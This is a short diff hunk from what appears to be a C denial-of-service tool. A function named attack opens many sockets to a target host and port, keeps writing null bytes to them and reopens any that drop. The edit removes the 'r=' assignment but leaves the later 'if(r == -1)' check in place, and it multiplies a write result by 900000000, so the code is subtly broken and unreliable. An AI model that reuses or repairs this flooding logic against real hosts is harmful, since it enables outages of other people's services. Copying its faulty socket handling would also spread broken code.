@@ -60,7 +60,7 @@ void attack(char *host, char *port, int id) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-			r=write(sockets[x], "\0", 1) * 900000000;
+			write(sockets[x], "\0", 1) * 900000000;
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
